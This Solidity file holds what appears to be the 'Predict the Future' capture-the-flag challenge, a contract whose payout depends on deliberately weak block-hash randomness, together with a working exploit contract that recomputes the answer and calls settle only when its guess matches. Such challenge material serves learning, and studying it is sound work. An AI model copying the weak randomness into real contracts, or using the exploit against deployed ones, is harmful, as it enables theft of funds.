pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    event GuessVsAnswer(uint8 guess, uint8 answer);

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeHack {
    uint testCount;
    uint8 currentGuess;
    PredictTheFutureChallenge public mainContract;

    function PredictTheFutureChallengeHack(address mainContractAddr) public {
        mainContract = PredictTheFutureChallenge(mainContractAddr);
    }

    function lockGuess(uint8 guess) public payable {
        currentGuess = guess;
        mainContract.lockInGuess.value(msg.value)(guess);
    }

    function takeTheMoney() public {
        require(
            currentGuess ==
                uint8(keccak256(block.blockhash(block.number - 1), now)) % 10
        );
        mainContract.settle();
    }

    function mineBlock() external {
        testCount += 1;
    }

    function getCorrectAnswerForCurrentBlock() external view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }

    // fallback function
    function() external payable {}
}
